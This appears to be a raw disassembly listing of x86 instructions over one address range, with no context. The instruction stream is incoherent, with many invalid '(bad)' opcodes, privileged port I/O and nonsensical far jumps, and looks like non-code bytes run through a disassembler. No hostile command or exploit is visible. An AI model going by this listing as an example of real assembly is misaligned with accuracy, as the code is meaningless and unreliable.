  414245:	sub    BYTE PTR [ecx+0x6757af4b],0xec
  41424c:	mov    eax,ds:0x5f383415
  414251:	int3   
  414252:	jo     0x414251
  414254:	xor    al,BYTE PTR [ebp+0x61]
  414257:	cld    
  414258:	sub    al,0xe7
  41425a:	pop    edi
  41425b:	repnz repz das 
  41425e:	cmp    BYTE PTR [edi-0x19],dh
  414261:	test   dl,bl
  414263:	mov    edx,0xb4792793
  414268:	mov    dl,0xe7
  41426a:	shr    eax,0x5a
  41426d:	out    dx,al
  41426e:	fwait
  41426f:	dec    eax
  414270:	fs push 0x9dd4e39a
  414276:	push   edi
  414277:	mov    ds:0x451408a3,al
  41427c:	jns    0x414285
  41427e:	jb     0x4142e2
  414280:	cmp    al,0x5b
  414282:	pop    esp
  414283:	pop    esp
  414284:	mov    ah,0x8b
  414286:	std    
  414287:	daa    
  414288:	sahf   
  414289:	adc    esi,DWORD PTR [edi+0x3e7cc16b]
  41428f:	cmp    DWORD PTR [ebx+0x5e840a1c],ebx
  414295:	gs pushf 
  414297:	mov    al,ds:0x109d74d7
  41429c:	ins    DWORD PTR es:[edi],dx
  41429d:	push   eax
  41429e:	pop    ds
  41429f:	aaa    
  4142a0:	faddp  st(2),st
  4142a2:	cmp    BYTE PTR [ebx+0x6606635e],ch
  4142a8:	push   ebx
  4142a9:	mov    edx,DWORD PTR [edx]
  4142ab:	add    DWORD PTR [edx-0xa],ebp
  4142ae:	pop    ebx
  4142af:	cmp    al,0x11
  4142b1:	es cld 
  4142b3:	loope  0x41425c
  4142b5:	mov    edx,0x12cb3566
  4142ba:	fcomp  QWORD PTR [edx]
  4142bc:	cmp    eax,0xd4c69f8
  4142c1:	xchg   DWORD PTR [edi-0x4f],esi
  4142c4:	pop    esp
  4142c5:	xchg   edi,eax
  4142c6:	pop    ebx
  4142c7:	jecxz  0x4142fb
  4142c9:	outs   dx,DWORD PTR ds:[esi]
  4142ca:	in     al,0xaf
  4142cc:	popf   
  4142cd:	push   ds
  4142ce:	or     DWORD PTR [edx+0x8],esi
  4142d1:	enter  0x3ffd,0xb6
  4142d5:	iret   
  4142d6:	xor    BYTE PTR [edx+0x67],al
  4142d9:	scas   eax,DWORD PTR es:[edi]
  4142da:	cmp    ebp,ebp
  4142dc:	sub    BYTE PTR [esi-0x3c0af13c],dh
  4142e2:	(bad)  
  4142e3:	cmp    al,BYTE PTR [ecx-0x7b]
  4142e6:	sub    ah,BYTE PTR [ebp-0x20e7c29]
  4142ec:	mov    dl,bh
  4142ee:	mov    edx,ecx
  4142f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f1:	mov    cl,0xf4
  4142f3:	mov    WORD PTR [ebx+0x1],cs
  4142f6:	sbb    eax,0x8fe955f9
  4142fb:	fadd   st,st(5)
  4142fd:	sahf   
  4142fe:	xor    bl,al
  414300:	cmc    
  414301:	pop    es
  414302:	jno    0x414312
  414304:	jne    0x414353
  414306:	jb     0x41429e
  414308:	outs   dx,DWORD PTR ds:[esi]
  414309:	inc    ebx
  41430a:	jae    0x4142be
  41430c:	stc    
  41430d:	ins    BYTE PTR es:[edi],dx
  41430e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41430f:	leave  
  414310:	sbb    eax,0xc215e6b6
  414315:	pop    esp
  414316:	dec    edx
  414317:	mov    al,0xd
  414319:	sub    al,0x4f
  41431b:	cmc    
  41431c:	mov    bl,BYTE PTR [esi]
  41431e:	mov    cl,0xe9
  414320:	jae    0x4142a8
  414322:	das    
  414323:	mov    dh,0x3
  414325:	call   0xbd27:0xee146b5c
  41432c:	ja     0x41434e
  41432e:	sbb    BYTE PTR [ecx],0x8d
  414331:	push   0x2d
  414333:	cs mov esp,0xbc934259
  414339:	jg     0x414309
  41433b:	in     eax,0xdf
  41433d:	push   0xffffffda
  41433f:	enter  0x200e,0xbc
  414343:	mov    WORD PTR [ecx],cs
  414345:	jg     0x414379
  414347:	mov    dl,0x3c
  414349:	xchg   edi,eax
  41434a:	lds    eax,FWORD PTR [ecx]
  41434c:	pop    ebx
  41434d:	cmp    BYTE PTR fs:[ecx+ecx*2],cl
  414351:	into   
  414352:	add    eax,0xc834cb46
  414357:	shl    cl,cl
  414359:	int    0x7b
  41435b:	or     ch,ah
  41435d:	cdq    
  41435e:	pop    edi
  41435f:	fidiv  WORD PTR [ebx]
  414361:	clc    
  414362:	add    ecx,ebx
  414364:	lahf   
  414365:	arpl   WORD PTR [ebp+0x76],dx
  414368:	inc    ebp
  414369:	mov    BYTE PTR [ecx+0x9],ah
  41436c:	xor    BYTE PTR [esi+eiz*2+0x3e6b0170],ah
  414373:	push   ebx
  414374:	pusha  
  414375:	push   ss
  414376:	(bad)  [edi]
  414378:	lds    esp,FWORD PTR [ebx-0x7370f91a]
  41437e:	stc    
  41437f:	inc    edi
  414380:	or     bl,BYTE PTR [esi+0x5a]
  414383:	outs   dx,DWORD PTR ds:[esi]
  414384:	xchg   esp,eax
  414385:	xchg   esp,eax
  414386:	scas   al,BYTE PTR es:[edi]
  414387:	aaa    
  414388:	inc    eax
  414389:	lock push eax
  41438b:	mov    dh,0xfb
  41438d:	mov    dh,0xf0
  41438f:	push   ss
  414390:	pshufw mm3,QWORD PTR [ebp-0x523aca2],0x4c
  414398:	mov    ds,WORD PTR [ebp-0x5440e67f]
  41439e:	sub    DWORD PTR [ecx],ebp
  4143a0:	into   
  4143a1:	xchg   edx,eax
  4143a2:	repz aas 
  4143a4:	cmp    BYTE PTR ds:0x4db25365,ch
  4143aa:	mov    ds:0xb4fe93ed,al
  4143af:	mov    ch,0xe9
  4143b2:	lods   al,BYTE PTR ds:[esi]
  4143b3:	jbe    0x41438e
  4143b5:	rcr    ecx,1
  4143b7:	cmc    
  4143b8:	pop    edi
  4143b9:	loope  0x414407
  4143bb:	dec    ebp
  4143bc:	and    edi,edx
  4143be:	add    edi,DWORD PTR ds:0xa66118c2
  4143c4:	cli    
  4143c5:	(bad)  
  4143c6:	mov    WORD PTR [ebx+ebp*4],ss
  4143c9:	fisub  DWORD PTR [eax]
  4143cb:	popf   
  4143cc:	inc    ebx
  4143cd:	inc    esi
  4143ce:	outs   dx,BYTE PTR ds:[esi]
  4143cf:	into   
  4143d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d1:	ss pushw es
  4143d4:	push   edx
  4143d5:	add    dl,ah
  4143d7:	scas   eax,DWORD PTR es:[edi]
  4143d8:	sbb    eax,DWORD PTR [ebp-0x3d]
  4143db:	jge    0x414427
  4143dd:	fs add al,0x35
  4143e0:	cdq    
  4143e1:	xchg   ebx,eax
  4143e2:	(bad)  
  4143e3:	iret   
  4143e4:	push   edi
  4143e5:	icebp  
  4143e6:	icebp  
  4143e7:	push   cs
  4143e8:	out    dx,eax
  4143e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ea:	pop    esi
  4143eb:	in     eax,dx
  4143ec:	mov    bh,0xb
  4143ee:	loope  0x4143fb
  4143f0:	dec    esp
  4143f1:	mov    esp,0xc62a9dfa
  4143f6:	inc    ebp
  4143f7:	popa   
  4143f8:	retf   
  4143f9:	fistp  WORD PTR [edi]
  4143fb:	and    eax,0x3d327118
  414400:	jne    0x4143c3
  414402:	push   0x33c14dfd
  414407:	pop    ss
  414408:	jo     0x41441c
  41440a:	sbb    dl,BYTE PTR [esi+ebx*1-0x4543b77]
  414411:	mov    edi,0xa6c9d214
  414416:	lods   al,BYTE PTR ds:[esi]
  414417:	retf   
  414418:	or     DWORD PTR ds:0x11c46593,eax
  41441e:	cs sbb al,0x1d
  414421:	test   BYTE PTR [ebp-0x5e2b6611],al
  414427:	sub    dl,BYTE PTR [ebx+ebx*1+0x74]
  41442b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442c:	xchg   edx,eax
  41442d:	push   eax
  41442e:	pop    ebx
  41442f:	xchg   edi,eax
  414430:	int3   
  414431:	js     0x41447f
  414433:	sub    al,0xde
  414435:	dec    edi
  414436:	jmp    0x4db7fcff
  41443b:	stc    
  41443c:	mov    esi,0x6071217c
  414441:	(bad)  
  414442:	xchg   ebp,eax
  414443:	loopne 0x414403
  414445:	cmp    al,0x6d
  414447:	and    dl,BYTE PTR [edi+0x4561c4cd]
  41444d:	mov    ebx,0x92d5d99a
  414452:	(bad)  
  414453:	mov    dh,0xd3
  414455:	in     eax,0x9e
  414457:	xchg   ebp,eax
  414458:	gs test edi,0x4b397e5
  41445f:	mov    ebp,0xad992d69
  414464:	adc    edx,edi
  414466:	test   DWORD PTR [edx-0x67],eax
  414469:	scas   al,BYTE PTR es:[edi]
  41446a:	jg     0x41445a
  41446c:	adc    dh,BYTE PTR [ecx+0x10]
  41446f:	into   
  414470:	or     edi,DWORD PTR [ebx-0x418dd1a]
  414476:	shl    BYTE PTR [ecx+ecx*8+0x347ff68a],cl
  41447d:	fnstenv [ebp-0x3f]
  414480:	mov    edx,0x75fd09d
  414485:	cwde   
  414486:	ror    edx,1
  414488:	mov    al,ds:0xaec40500
  41448d:	test   eax,0x27ade3c1
  414492:	int3   
  414493:	ja     0x4144ec
  414495:	js     0x41447c
  414497:	pop    ds
  414498:	xchg   edi,eax
  414499:	add    BYTE PTR [esi+0x507cc50e],0x14
  4144a0:	xor    edx,esi
  4144a2:	add    BYTE PTR [edi+ebp*1-0x5c],ah
  4144a6:	std    
  4144a7:	and    BYTE PTR [edi-0x79f2c876],bh
  4144ad:	fisub  WORD PTR ds:0xf59f2113
  4144b3:	retf   
  4144b4:	in     al,dx
  4144b5:	add    BYTE PTR [ebx-0x32],dl
  4144b8:	jp     0x414498
  4144ba:	mov    edx,0x15f2187a
  4144bf:	fidivr WORD PTR [edi-0x51]
  4144c2:	jp     0x414505
  4144c4:	jno    0x414543
  4144c6:	fcomp  st(2)
  4144c8:	loope  0x414531
  4144ca:	mov    ebp,0x22de7e00
  4144cf:	push   0x16
  4144d1:	push   ebx
  4144d2:	popf   
  4144d3:	mov    esi,0x10886112
  4144d8:	pushf  
  4144d9:	hlt    
  4144da:	push   ebx
  4144db:	and    BYTE PTR [ebx],ch
  4144dd:	pop    edx
  4144de:	repz aam 0x8f
  4144e1:	aaa    
  4144e2:	(bad)  
  4144e3:	mov    ah,0x59
  4144e5:	cmc    
  4144e6:	ficom  WORD PTR [ebp-0x41f071d7]
  4144ec:	loope  0x4144ec
  4144ee:	and    cl,ch
  4144f0:	pop    esi
  4144f1:	sbb    ebx,DWORD PTR [edx-0x6cdc5841]
  4144f7:	xchg   edi,eax
  4144f8:	mov    ah,0xc5
  4144fa:	inc    esp
  4144fb:	dec    edi
  4144fc:	dec    eax
  4144fd:	bnd jle 0x414518
  414500:	js     0x41453b
  414502:	mov    ch,0xf2
  414504:	sub    eax,0x3e9fb7ea
  414509:	or     eax,0x57365c91
  41450e:	adc    DWORD PTR [eax+ebp*8],ecx
  414511:	popa   
  414512:	aas    
  414513:	cmp    ah,ah
  414515:	xor    DWORD PTR [edx-0x27],edx
  414518:	cmp    BYTE PTR [eax],ch
  41451a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41451b:	(bad)  
  41451c:	out    0x8b,eax
  41451e:	xchg   edi,eax
  41451f:	rcr    BYTE PTR [esi+ecx*4-0x15],0x93
  414524:	push   esp
  414525:	cs hlt 
  414527:	pop    ebp
  414528:	mov    ebp,0x2f5b379c
  41452d:	add    eax,DWORD PTR [edx-0x78c4301b]
  414533:	es pop ecx
  414535:	and    al,0x99
  414537:	test   eax,0x6e04d05b
  41453c:	ins    BYTE PTR es:[edi],dx
  41453d:	and    DWORD PTR [edx+0x36],esp
  414540:	push   cs
  414541:	lahf   
  414542:	push   ss
  414543:	fldenv [esi+eax*8]
  414546:	xchg   cl,cl
  414548:	inc    edi
  414549:	mov    bl,0xa
  41454b:	stc    
  41454c:	(bad)  
  41454d:	sbb    edi,ebp
  41454f:	jno    0x4145b7
  414551:	sub    ebp,DWORD PTR [edx+0x3d]
  414554:	pop    eax
  414555:	mov    ah,0xac
  414557:	mov    eax,ds:0x70cccfb4
  41455c:	mov    bh,0x66
  41455e:	cli    
  41455f:	pusha  
  414560:	jbe    0x41455b
  414562:	pop    esi
  414563:	adc    BYTE PTR [ebp-0x5793ac3b],dh
  414569:	ins    BYTE PTR es:[edi],dx
  41456a:	adc    BYTE PTR [edi+0x62],bh
  41456d:	xor    al,0xd7
  41456f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414570:	xor    BYTE PTR [ebp-0xa],ah
  414573:	sbb    DWORD PTR [edi-0x11],ebx
  414576:	js     0x4145b3
  414578:	push   eax
  414579:	loop   0x41450d
  41457b:	fst    st(6)
  41457d:	call   0xfbd0:0x9119ef02
  414584:	xchg   edi,eax
  414585:	mov    esi,0x2baac8d0
  41458a:	or     al,BYTE PTR [edx-0x2f]
  41458d:	sbb    ebp,DWORD PTR [eax-0x14e2f61]
  414593:	pop    es
  414594:	dec    esi
  414595:	scas   al,BYTE PTR es:[edi]
  414596:	inc    esi
  414597:	pop    ecx
  414598:	ss scas al,BYTE PTR es:[edi]
  41459a:	test   DWORD PTR [ebx],0xba1b63a8
  4145a0:	hlt    
  4145a1:	sbb    esp,ebx
  4145a3:	sbb    al,0xb3
  4145a5:	in     al,dx
  4145a6:	lea    edx,[eax+eiz*8]
  4145a9:	test   DWORD PTR [eax],ebx
  4145ab:	pop    edx
  4145ac:	je     0x4145f4
  4145ae:	mov    al,ds:0x39699bbc
  4145b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b4:	mov    edx,0xfbd6115e
  4145b9:	outs   dx,DWORD PTR ds:[esi]
  4145ba:	pop    eax
  4145bb:	xchg   ebx,eax
  4145bc:	push   ss
  4145bd:	sub    eax,0x2eda1d53
  4145c2:	push   ecx
  4145c3:	pushf  
  4145c4:	push   es
  4145c5:	test   BYTE PTR [edi-0xb],al
  4145c8:	popf   
  4145c9:	add    al,0x84
  4145cb:	pushf  
  4145cc:	mov    BYTE PTR [ecx-0x69],ch
  4145cf:	(bad)  ss:[edi-0x59]
  4145d3:	add    edi,edx
  4145d5:	add    DWORD PTR [esi+0x957bb03],esp
  4145db:	xchg   edi,eax
  4145dc:	pusha  
  4145dd:	sbb    BYTE PTR [eax],cl
  4145df:	rcr    BYTE PTR [ebp+0x25],1
  4145e2:	xor    DWORD PTR [edi],ecx
  4145e4:	or     ah,bl
  4145e6:	jo     0x414595
  4145e8:	push   ss
  4145e9:	ja     0x414592
  4145eb:	push   edx
  4145ec:	cld    
  4145ed:	sbb    bh,BYTE PTR [ebx-0x686970ef]
  4145f3:	inc    eax
  4145f4:	daa    
  4145f5:	xchg   edi,eax
  4145f6:	sbb    ch,cl
  4145f8:	mov    eax,0xc9b215ed
  4145fd:	xchg   ebp,eax
  4145fe:	ins    DWORD PTR es:[edi],dx
  4145ff:	rcl    BYTE PTR [esi-0x3a70a009],1
  414605:	inc    esi
  414606:	js     0x414642
  414608:	sbb    al,0xd3
  41460a:	aad    0x32
  41460c:	dec    ecx
  41460d:	dec    esp
  41460e:	mov    ecx,0xd808c6dd
  414613:	fistp  QWORD PTR [esp+edi*8+0x69d5ce22]
  41461a:	ins    BYTE PTR es:[edi],dx
  41461b:	add    eax,eax
  41461d:	ins    DWORD PTR es:[edi],dx
  41461e:	enter  0x884c,0x34
  414622:	sbb    al,0xe0
  414624:	test   dl,ch
  414626:	sub    eax,0xd6b053b1
  41462b:	push   0xac95186a
  414630:	into   
  414631:	frndint 
  414633:	mov    ds:0x45608310,al
  414638:	push   edi
  414639:	dec    edi
  41463a:	mov    esi,0x7ce6562d
  41463f:	jmp    0x41464d
  414641:	add    al,BYTE PTR [edi]
  414643:	or     DWORD PTR [esi+0x2443aec6],esi
  414649:	mov    ebx,DWORD PTR [esi]
  41464b:	jo     0x414694
  41464d:	or     ch,dl
  41464f:	sub    eax,0x685c6c07
  414654:	dec    edi
  414655:	pop    esp
  414656:	dec    ebp
  414657:	push   ds
  414658:	add    DWORD PTR ds:0xb704340d,0x6a
  41465f:	jmp    0x4146b9
  414661:	dec    esp
  414662:	pop    edx
  414663:	sbb    dh,BYTE PTR [eax+0x4a927dc8]
  414669:	aaa    
  41466a:	fst    QWORD PTR [eax+0x3]
  41466d:	jbe    0x414697
  41466f:	push   ds
  414670:	xor    ebx,ebx
  414672:	mul    edx
  414674:	test   BYTE PTR [edi-0x1],0xf0
  414678:	scas   al,BYTE PTR es:[edi]
  414679:	jbe    0x4146d5
  41467b:	push   ss
  41467c:	in     eax,dx
  41467d:	pop    ds
  41467e:	pop    edi
  41467f:	add    DWORD PTR [ebx-0x387ebcc7],0x10c97759
  414689:	or     eax,0x3017746d
  41468e:	ins    DWORD PTR es:[edi],dx
  41468f:	outs   dx,DWORD PTR ds:[esi]
  414690:	cdq    
  414691:	inc    esp
  414692:	jp     0x4146c7
  414694:	inc    eax
  414695:	and    al,0xa1
  414697:	popf   
  414698:	cmp    BYTE PTR [ebx+esi*4+0x479af19c],bh
  41469f:	push   eax
  4146a0:	add    al,BYTE PTR [ecx-0x26]
  4146a3:	sbb    bl,BYTE PTR [edi-0x1]
  4146a6:	into   
  4146a7:	mov    ebp,0x1a19b100
  4146ac:	or     bh,BYTE PTR [ecx]
  4146ae:	in     eax,0xce
  4146b0:	addr16 in al,dx
  4146b2:	lods   eax,DWORD PTR ds:[esi]
  4146b3:	faddp  st(6),st
  4146b5:	inc    ebp
  4146b6:	dec    ebp
  4146b7:	xchg   esp,eax
  4146b8:	xchg   DWORD PTR [esi-0x7b919de],ebx
  4146be:	pusha  
  4146bf:	rcl    ebx,1
  4146c1:	pop    esp
  4146c2:	xor    al,0xfe
  4146c4:	enter  0x6059,0xcf
  4146c8:	inc    ecx
  4146c9:	or     edi,DWORD PTR [esp+ebx*8+0xaea4847]
  4146d0:	inc    esi
  4146d1:	push   ss
  4146d2:	call   DWORD PTR [edi+0x7b]
  4146d5:	repnz inc esp
  4146d7:	cmp    DWORD PTR [ecx+0xf],ecx
  4146da:	sbb    DWORD PTR [esp+esi*2],esi
  4146dd:	ret    0xb9d3
  4146e0:	xor    dh,0x8c
  4146e3:	xchg   esp,eax
  4146e4:	out    dx,al
  4146e5:	pop    edi
  4146e6:	add    bl,BYTE PTR [eax-0x7d]
  4146e9:	imul   esp,DWORD PTR [ebx+ebx*2],0x734adf6
  4146f0:	mul    BYTE PTR cs:[esp+eiz*2+0x6436833f]
  4146f8:	mov    edi,0x31b40059
  4146fd:	sbb    DWORD PTR [eax+0x11abc70e],esp
  414703:	cmp    eax,0x44431bc7
  414708:	sub    ebx,esi
  41470a:	push   eax
  41470b:	xchg   ecx,eax
  41470c:	jae    0x41476b
  41470e:	lds    eax,FWORD PTR [edi-0x71]
  414711:	cmc    
  414712:	comiss xmm2,DWORD PTR [edi+0x68]
  414716:	ret    
  414717:	sti    
  414718:	(bad)  
  414719:	jge    0x414787
  41471b:	cmp    DWORD PTR [ecx+edx*8+0x4f5637f],eax
  414722:	and    DWORD PTR [ebx+eax*1],edx
  414725:	push   eax
  414726:	pop    ss
  414727:	test   DWORD PTR [esi-0x2e10fa88],0x1e464012
  414731:	pop    esp
  414732:	xchg   DWORD PTR [ebx+0x4884010],eax
  414738:	gs gs loop 0x4146eb
  41473c:	test   al,0x1d
  41473e:	fnstsw WORD PTR [edx-0x2c6e394e]
  414744:	test   al,0x93
  414746:	push   ss
  414747:	mov    edi,0x5a3e9052
  41474c:	out    dx,eax
  41474d:	test   eax,0x710e62ab
  414752:	xor    esi,DWORD PTR ds:0x3e82086e
  414758:	lods   eax,DWORD PTR ds:[esi]
  414759:	out    0x15,al
  41475b:	mov    eax,0x9f09d1e4
  414760:	cmp    eax,DWORD PTR [ebx]
  414762:	leave  
  414763:	aaa    
  414764:	aas    
  414765:	and    eax,0x98d56e9c
  41476a:	pushf  
  41476b:	popa   
  41476c:	xchg   BYTE PTR ds:0x817e0617,cl
  414772:	mov    BYTE PTR [ebx],al
  414774:	mov    edi,DWORD PTR [ebp+esi*4+0x24]
  414778:	inc    ecx
  414779:	mov    eax,ds:0x6b2236ef
  41477e:	cmc    
  41477f:	push   ecx
  414780:	pop    ss
  414781:	sbb    BYTE PTR [edx+0x44b20ae7],0x8f
  414788:	xor    esp,DWORD PTR [eax+0x572917aa]
  41478e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41478f:	push   ebp
  414790:	adc    eax,DWORD PTR [ecx]
  414792:	ds ins BYTE PTR es:[edi],dx
  414794:	adc    BYTE PTR [ecx+0x1aafd451],0x10
  41479b:	popf   
  41479c:	add    eax,0x656382dd
  4147a1:	pop    es
  4147a2:	fld    DWORD PTR [ecx+0x6f0c422b]
  4147a8:	das    
  4147a9:	jns    0x4147eb
  4147ab:	pop    ss
  4147ac:	sbb    ch,BYTE PTR [edx-0x5d30a127]
  4147b2:	aas    
  4147b3:	mov    eax,ds:0xa04b0ee7
  4147b8:	sbb    eax,ecx
  4147ba:	push   eax
  4147bb:	xchg   edx,eax
  4147bc:	icebp  
  4147bd:	xlat   BYTE PTR ds:[ebx]
  4147be:	into   
  4147bf:	lds    esi,FWORD PTR [esi+0x4d4089df]
  4147c5:	sub    edx,DWORD PTR [eax-0x71910995]
  4147cb:	mov    DWORD PTR [edi-0x56464bb1],esi
  4147d1:	inc    edx
  4147d2:	into   
  4147d3:	cmc    
  4147d4:	and    al,0x31
  4147d6:	jl     0x41476f
  4147d8:	test   al,0x4
  4147da:	dec    edx
  4147db:	sbb    DWORD PTR [edi+0x2b],edi
  4147de:	add    al,0x2d
  4147e0:	mov    bh,0xea
  4147e2:	dec    esi
  4147e3:	push   ss
  4147e4:	pop    edi
  4147e5:	out    0x33,al
  4147e7:	pop    edi
  4147e8:	in     al,0xa5
  4147ea:	(bad)  [edi+esi*2]
  4147ed:	pusha  
  4147ee:	bound  ecx,QWORD PTR [eax+edi*4]
  4147f1:	int    0x4c
  4147f3:	dec    DWORD PTR [ebp+0x5b4e4ce6]
  4147f9:	shr    BYTE PTR [esi-0x7e],0xa0
  4147fd:	jo     0x253f30e1
  414803:	shr    ecx,1
  414805:	sub    al,0x47
  414807:	mov    ah,dh
  414809:	add    esi,DWORD PTR [esi+0x64209437]
  41480f:	sub    edx,DWORD PTR [edi+0x6f]
  414812:	sahf   
  414813:	cmp    BYTE PTR [ebx],cl
  414815:	add    dl,BYTE PTR [edx-0x7f5da88c]
  41481b:	mov    ch,0xca
  41481d:	or     DWORD PTR [eax],0x58
  414820:	jbe    0x41485f
  414822:	sbb    al,0x41
  414824:	dec    eax
  414825:	or     ebx,DWORD PTR [bx-0x1962]
  41482a:	mov    esp,0xacde0e91
  41482f:	loop   0x4147fa
  414831:	loop   0x414892
  414833:	adc    al,0x64
  414835:	inc    eax
  414836:	push   eax
  414837:	dec    ecx
  414838:	sti    
  414839:	bound  ecx,QWORD PTR [eax]
  41483b:	(bad)
  41483e:	fidivr DWORD PTR [ecx+0x27]
  414841:	clc    
  414842:	rcl    DWORD PTR [edx-0x7829f670],cl
  414848:	xchg   edx,eax
  414849:	loope  0x414820
  41484b:	or     DWORD PTR [ecx+0x3185a243],edi
  414851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414852:	out    dx,eax
  414853:	push   eax
  414854:	into   
  414855:	adc    eax,0x83d40489
  41485a:	(bad)  
  41485b:	push   0x90f09917
  414860:	dec    eax
  414861:	sar    BYTE PTR [edi+0x5b755822],cl
  414867:	sbb    bh,BYTE PTR ds:0xf7332645
  41486d:	cmp    DWORD PTR [ebx+0x7277a3f1],ebp
  414873:	aam    0xd7
  414875:	mov    bl,0xd8
  414877:	dec    ebp
  414878:	pop    ecx
  414879:	enter  0xf659,0x6e
  41487d:	xchg   edi,eax
  41487e:	fucomip st,st(4)
  414880:	(bad)  [edi-0x1c]
  414883:	fldenv [esi+0x36]
  414886:	mov    ch,0x32
  414888:	arpl   WORD PTR [edi],cx
  41488a:	xchg   DWORD PTR [edi],eax
  41488c:	xchg   esi,eax
  41488d:	add    BYTE PTR [ebp-0x505146e2],al
  414893:	inc    ecx
  414894:	in     eax,dx
  414895:	xchg   DWORD PTR [edx+0x485132fe],edi
  41489b:	jle    0x414846
  41489d:	push   eax
  41489e:	jp     0x414914
  4148a0:	addr16 add ah,dl
  4148a3:	outs   dx,DWORD PTR ds:[esi]
  4148a4:	lock inc ecx
  4148a6:	cld    
  4148a7:	in     al,dx
  4148a8:	loop   0x41491f
  4148aa:	xlat   BYTE PTR ds:[ebx]
  4148ab:	test   al,0xb2
  4148ad:	jmp    0xb142:0xae84f359
  4148b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148b5:	sub    cl,al
  4148b7:	mov    ds,WORD PTR [ecx-0x2]
  4148ba:	xchg   ebx,eax
  4148bb:	cld    
  4148bc:	dec    edi
  4148bd:	outs   dx,BYTE PTR ds:[esi]
  4148be:	pop    ss
  4148bf:	popf   
  4148c0:	lock inc esi
  4148c2:	jmp    0x66b5f465
  4148c7:	pop    edx
  4148c8:	cmp    esi,edx
  4148ca:	shr    dh,0x6d
  4148cd:	loope  0x414899
  4148cf:	push   0x2fae44e8
  4148d4:	sub    cl,BYTE PTR [esi+ecx*1-0x49]
  4148d8:	arpl   di,ax
  4148da:	mov    ah,0x51
  4148dc:	mov    ecx,0xbe9edae7
  4148e1:	adc    dl,BYTE PTR [esi+0x7e]
  4148e4:	adc    DWORD PTR [edi+0x1a],ecx
  4148e7:	aad    0x32
  4148e9:	popf   
  4148ea:	mov    DWORD PTR ds:0xe7e4c1ed,ebp
  4148f0:	inc    edx
  4148f1:	stos   BYTE PTR es:[edi],al
  4148f2:	push   cs
  4148f3:	les    eax,FWORD PTR [ebx-0x4714da38]
  4148f9:	shl    BYTE PTR [edx],cl
  4148fb:	jmp    0x17ee09b
  414900:	mov    ds:0xab6c79bb,al
  414905:	jbe    0x4148d4
  414907:	out    0xba,eax
  414909:	xor    edx,ecx
  41490b:	call   0x832af317
  414910:	neg    cl
  414912:	fmul   DWORD PTR [edx+0x1315fe12]
  414918:	sub    ch,bl
  41491a:	mul    BYTE PTR [ebp-0x3a524239]
  414920:	mov    ?,eax
  414922:	mov    al,ds:0x3900f24e
  414927:	lock repz mov eax,0x52d9fc0
  41492e:	dec    edx
  41492f:	fldcw  WORD PTR [edx]
  414931:	mov    eax,0x78767c21
  414936:	adc    edi,DWORD PTR [esi]
  414938:	les    ecx,FWORD PTR [eax+0xd]
  41493b:	push   ds
  41493c:	or     eax,0x75626c8a
  414941:	dec    ecx
  414942:	push   ds
  414943:	pop    ss
  414944:	mov    esi,0xc5dfc81b
  414949:	xchg   esp,eax
  41494a:	in     al,0x44
  41494c:	repnz push es
  41494e:	xor    dl,al
  414950:	loopne 0x414953
  414952:	or     ecx,DWORD PTR [edx-0x27]
  414955:	inc    edx
  414956:	cmp    eax,0x7703a142
  41495b:	lods   al,BYTE PTR ds:[esi]
  41495c:	aaa    
  41495d:	xchg   ebx,eax
  41495e:	xlat   BYTE PTR ds:[ebx]
  41495f:	cmp    DWORD PTR [ecx+ebx*1+0x2f],esp
  414963:	xchg   esi,eax
  414964:	sbb    esp,ebx
  414966:	in     al,dx
  414967:	stos   BYTE PTR es:[edi],al
  414968:	in     al,0x8d
  41496a:	fidivr WORD PTR [esi-0xc]
  41496d:	sbb    ch,bl
  41496f:	push   ss
  414970:	mov    al,0xd3
  414972:	(bad)  
  414973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414974:	repz add al,0xbf
  414978:	ret    
  414979:	(bad)  
  41497a:	or     al,0x69
  41497c:	lods   al,BYTE PTR ds:[esi]
  41497d:	pop    ss
  41497e:	clc    
  41497f:	cmovns edi,DWORD PTR [esi+eiz*1]
  414983:	(bad)  
  414985:	ins    BYTE PTR es:[edi],dx
  414986:	mov    bh,ch
  414988:	inc    edx
  414989:	push   edi
  41498a:	xor    eax,esp
  41498c:	aam    0xab
  41498e:	sbb    al,cl
  414990:	loope  0x414986
  414992:	jns    0x41499e
  414994:	shr    BYTE PTR [ecx+eiz*4],1
  414997:	inc    eax
  414998:	fcomip st,st(2)
  41499a:	pop    edi
  41499b:	inc    BYTE PTR [esp+ecx*4-0x34]
  41499f:	mov    bh,0xe0
  4149a1:	inc    ecx
  4149a3:	or     ebx,DWORD PTR [ebp+0x9]
  4149a6:	out    0x3f,al
  4149a8:	cdq    
  4149a9:	inc    esi
  4149aa:	fcomp  QWORD PTR [esi+0x46ab1b42]
  4149b0:	jo     0x4149bc
  4149b2:	adc    eax,0xae0469
  4149b7:	xor    DWORD PTR [edx+0x7],ebp
  4149ba:	retf   
  4149bb:	popf   
  4149bc:	cmp    BYTE PTR [ebx-0x72fa8d4c],0xbe
  4149c3:	mov    edi,0x23bd3d0c
  4149c8:	ret    0x6077
  4149cb:	xor    ecx,ecx
  4149cd:	retf   
  4149ce:	fbstp  TBYTE PTR [ecx*4+0xf14fc7d]
  4149d5:	fbstp  TBYTE PTR [edi-0x39]
  4149d8:	dec    ecx
  4149d9:	sbb    eax,0xe853f8a1
  4149de:	in     eax,dx
  4149df:	add    eax,0x41
  4149e2:	stc    
  4149e3:	ror    BYTE PTR [ebx-0x5f77c7e2],1
  4149e9:	(bad)  
  4149ea:	int3   
  4149eb:	inc    edx
  4149ec:	mov    ss,WORD PTR [ebx-0x69]
  4149ef:	aaa    
  4149f0:	jo     0x414a4e
  4149f2:	aas    
  4149f3:	(bad)  
  4149f4:	sar    DWORD PTR [esi+0x78],1
  4149f7:	test   DWORD PTR ds:0x8a181e4,esp
  4149fd:	mov    eax,ds:0x8106c872
  414a02:	xchg   ebp,eax
  414a03:	clc    
